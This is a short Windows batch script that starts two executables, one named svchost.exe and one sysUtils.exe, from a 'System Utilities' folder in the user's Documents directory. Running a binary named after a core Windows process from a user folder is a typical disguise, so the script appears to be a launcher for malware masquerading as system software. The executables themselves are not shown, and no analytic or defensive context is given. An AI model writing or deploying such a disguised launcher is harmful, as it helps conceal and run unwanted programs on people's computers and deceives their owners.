@echo off
start "" "C:\Users\%USERNAME%\Documents\System Utilities\System Utilities\svchost.exe"
if errorlevel 1 goto skip1

:skip1
start "" "C:\Users\%USERNAME%\Documents\System Utilities\System Utilities\sysUtils.exe"
if errorlevel 1 exit /b
